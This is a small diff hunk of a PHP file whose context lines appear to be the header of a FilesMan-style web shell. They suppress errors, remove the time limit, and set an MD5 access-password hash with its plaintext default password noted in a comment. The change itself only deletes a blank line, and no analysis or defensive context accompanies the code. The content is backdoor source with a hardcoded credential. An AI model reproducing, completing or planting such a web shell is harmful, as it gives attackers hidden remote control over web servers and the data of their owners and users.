@@ -2,7 +2,6 @@
 session_start();
 error_reporting(0);
 set_time_limit(0);
-
 $auth_pass = "b48de51c5ce44d70f04878419dcb9f8c"; // default: kctpusat45
 $color = "white";
 $default_action = 'FilesMan';
